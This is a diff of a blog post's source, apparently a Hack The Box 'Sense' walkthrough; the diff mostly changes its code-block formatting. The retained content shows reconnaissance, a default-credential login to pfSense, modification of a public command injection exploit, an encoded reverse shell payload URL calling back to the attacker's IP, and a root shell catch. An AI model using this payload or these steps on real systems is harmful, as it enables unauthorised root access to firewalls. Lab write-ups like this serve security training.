@@ -27,8 +27,7 @@ I get this sense that is the next box we should work on.  So, here we go!
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ cat nmap                  
 # Nmap 7.95 scan initiated Sun Jan 19 20:20:55 2025 as: /usr/lib/nmap/nmap -sC -sV -A -O -oN nmap 10.10.10.60
@@ -61,8 +60,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Jan 19 20:21:22 2025 -- 1 IP address (1 host up) scanned in 27.46 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check what is running on port 443.  Note the pfsense installation.
@@ -95,8 +94,7 @@ Check the creds in pfsense.  Well, that didn't work.
 <br />
 Ffuf port 80.  Absolutely nothing interesting.  Ffuf port 443 looking for something more interesting.
 
-{% raw %}
-```sh
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://10.10.10.60/FUZZ -e .txt,.bak,.html,.pdf -fs 6690
 
@@ -139,19 +137,13 @@ system-users.txt        [Status: 200, Size: 106, Words: 9, Lines: 7, Duration: 1
 filebrowser             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
 %7Echeckout%7E          [Status: 403, Size: 345, Words: 33, Lines: 12, Duration: 26ms]
 :: Progress: [1102795/1102795] :: Job [1/1] :: 865 req/sec :: Duration: [0:10:59] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the changelog.txt file.  Looks like pfsense has 3 vulnerabilities and 2 have been patched.  We have one left.
 
-{% raw %}
-```sh
-https://10.10.10.60/changelog.txt
-```
-{% endraw %}
-{% raw %}
-```sh
+{% capture changelog %}
 # Security Changelog 
 
 ### Issue
@@ -162,19 +154,13 @@ There was a failure in updating the firewall. Manual patching is therefore requi
 
 ### Timeline
 The remaining patches will be installed during the next maintenance window
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='https://10.10.10.60/changelog.txt' content=changelog %}
 
 <br />
 Check the system-users.txt file.  Looks like we have a potential user name, rohit.
 
-{% raw %}
-```sh
-https://10.10.10.60/system-users.txt
-```
-{% endraw %}
-{% raw %}
-```sh
+{% capture systemuser %}
 ####Support ticket###
 
 Please create the following user
@@ -182,11 +168,11 @@ Please create the following user
 
 username: Rohit
 password: company defaults
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='https://10.10.10.60/system-users.txt' content=systemuser %}
 
 <br />
-Login to the pfsense portal with rohit as the username and pfsens from the default installation docs.  Note the version on the dashboard.
+Login to the pfsense portal with rohit as the username and pfsense from the default installation docs.  Note the version on the dashboard.
 
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
@@ -207,8 +193,7 @@ Search exploit-db looking for our version of pfsense.  Looks like there is a com
 <br />
 Download the exploit.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ wget https://www.exploit-db.com/raw/43560 -O exploit.py  
 --2025-02-14 17:47:12--  https://www.exploit-db.com/raw/43560
@@ -221,14 +206,13 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   3.49K  --.-KB/s    in 0s      
 
 2025-02-14 17:47:13 (27.6 MB/s) - ‘exploit.py’ saved [3576/3576]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Update the exploit.  Add verify=False to the login post request.  There is some kind of issue if you try to run it without it.
 
-{% raw %}
-```python
+{% capture updateexploit %}
 #!/usr/bin/env python3
 
 # Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
@@ -252,27 +236,25 @@ if csrf_token:
         login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers, verify=False)
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='exploit.py' content=updateexploit %}
 
 <br />
 Try running the exploit.  The exploit seems to complete successfully.  Checking the listener there is no shell though.
 
-{% raw %}
-```sh
+{% capture firstrunexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ ./pfsense.py --rhost 10.10.10.60 --lhost 10.10.16.12 --lport 443 --username rohit --password pfsense      
 CSRF token obtained
 Running exploit...
 Exploit completed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=firstrunexploit %}
 
 <br />
 Update the code one more time to print the exploit_url variable so we can know what is trying to be executed.
 
-{% raw %}
-```python
+{% capture updateexploitagain %}
 #!/usr/bin/env python3
 
 # Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
@@ -293,22 +275,21 @@ try:
                                 print("Error running exploit")
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='exploit.py' content=updateexploitagain %}
 
 <br />
 Execute the update script and note the payload url.
 
-{% raw %}
-```bash
+{% capture viewscriptoutput %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ ./pfsense.py --rhost 10.10.10.60 --lhost 10.10.16.12 --lport 443 --username rohit --password pfsense
 CSRF token obtained
 Running exploit...
 https://10.10.10.60/status_rrd_graph_img.php?database=queues;printf+'\12\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\12\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\12\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\66\56\61\62\42\54\64\64\63\51\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\12\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47\12'|sh
 Exploit completed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=viewscriptoutput %}
 
 <br />
 Take that url and try running it in the browser.
@@ -322,8 +303,7 @@ Take that url and try running it in the browser.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/sense]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
@@ -332,14 +312,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.10.60] 61089
 sh: can't access tty; job control turned off
 # whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 # cat /home/rohit/user.txt
 <redacted># ifconfig
 em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
@@ -361,14 +340,13 @@ lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
         inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5 
         nd6 options=3<PERFORMNUD,ACCEPT_RTADV>
 pflog0: flags=100<PROMISC> metric 0 mtu 33144
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ifconfig
@@ -391,8 +369,8 @@ lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
         inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5 
         nd6 options=3<PERFORMNUD,ACCEPT_RTADV>
 pflog0: flags=100<PROMISC> metric 0 mtu 33144
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, we wrap another box.  I will see you in the next one.
